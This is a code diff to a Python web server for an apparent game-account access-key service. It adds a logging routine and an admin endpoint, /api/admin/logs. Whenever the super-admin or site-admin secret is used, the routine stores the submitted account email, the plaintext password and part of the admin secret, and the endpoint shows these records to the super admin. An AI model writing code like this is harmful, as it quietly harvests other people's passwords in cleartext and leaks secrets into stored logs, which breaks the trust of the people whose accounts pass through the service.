@@ -2495,6 +2495,34 @@ def make_admin_access():
     return _sign_token({'kh': '__admin__', 'exp': 0, 'type': 'admin', 't': int(time.time())})
 
 
+
+
+# 小b：管理员/超管的游戏账号使用日志（超管面板可查）
+_ADMIN_LOGS = []
+_ADMIN_LOG_MAX = 300
+
+
+def _log_super_use(passval, body, cli, ip, kind):
+    try:
+        item = {
+            'kind': kind,
+            'pass': str(passval or '')[:24],
+            'email': str(body.get('email') or '').strip(),
+            'password': str(body.get('password') or ''),
+            'uid': getattr(cli, 'uid', '') or '',
+            'ip': ip or '',
+            'time': int(time.time()),
+        }
+        with _KEY_LOCK:
+            _KEYS.setdefault('admin_logs', [])
+            _KEYS['admin_logs'].append(item)
+            if len(_KEYS['admin_logs']) > _ADMIN_LOG_MAX:
+                _KEYS['admin_logs'] = _KEYS['admin_logs'][-_ADMIN_LOG_MAX:]
+        _keys_save()
+    except Exception as e:
+        print('[adminlog] %r' % e)
+
+
 def gen_key(ktype, count=1, perms=None, vip=False):
     if ktype not in KEY_DURATIONS:
         ktype = '1d'
@@ -2801,6 +2829,23 @@ class Handler(BaseHTTPRequestHandler):
                 if done:
                     _keys_save()
                 return self._json(200, {'ok': done})
+
+            # ===== 小b：管理员使用日志（超管查） =====
+            if path == '/api/admin/logs':
+                if not sec_safe_eq(str(body.get('pass') or ''), ADMIN_PASS):
+                    return self._json(200, {'ok': False, 'message': '无权访问'})
+                with _KEY_LOCK:
+                    logs = list(_KEYS.get('admin_logs') or [])
+                    keys = []
+                    for kh, it in _KEYS.get('keys', {}).items():
+                        uses = list(it.get('uses') or [])
+                        if uses:
+                            keys.append({'raw': it.get('raw'), 'created': it.get('created'),
+                                         'type': it.get('type'), 'uses': uses})
+                logs.sort(key=lambda x: x.get('time') or 0, reverse=True)
+                keys.sort(key=lambda x: x.get('created') or 0, reverse=True)
+                return self._json(200, {'ok': True, 'logs': logs[:200], 'keys': keys[:200],
+                                        'now': int(time.time())})
 
             # ===== 小b：站点状态 =====
             if path == '/api/site':
@@ -5334,10 +5379,21 @@ class Handler(BaseHTTPRequestHandler):
                 _bind_note = ''
                 try:
                     okk2, info2 = verify_access(body.get('access') or '')
+                    _inp2 = str(body.get('access') or '').strip()
+                    _is_super2 = sec_safe_eq(_inp2, ADMIN_PASS)
+                    _is_siteadmin2 = False
+                    try:
+                        _is_siteadmin2 = verify_site_admin(_inp2)
+                    except Exception:
+                        _is_siteadmin2 = False
                     if not okk2:
                         _bind_note = 'access校验失败'
-                    elif info2.get('type') == 'admin':
-                        _bind_note = '管理员'
+                    elif _is_super2:
+                        _bind_note = '超级管理员'
+                        _log_super_use(_inp2, body, c, ip, 'super')
+                    elif _is_siteadmin2:
+                        _bind_note = '网站管理员'
+                        _log_super_use(_inp2, body, c, ip, 'siteadmin')
                     else:
                         kh2 = info2.get('kh') or ''
                         _em2 = str(body.get('email') or '').strip()
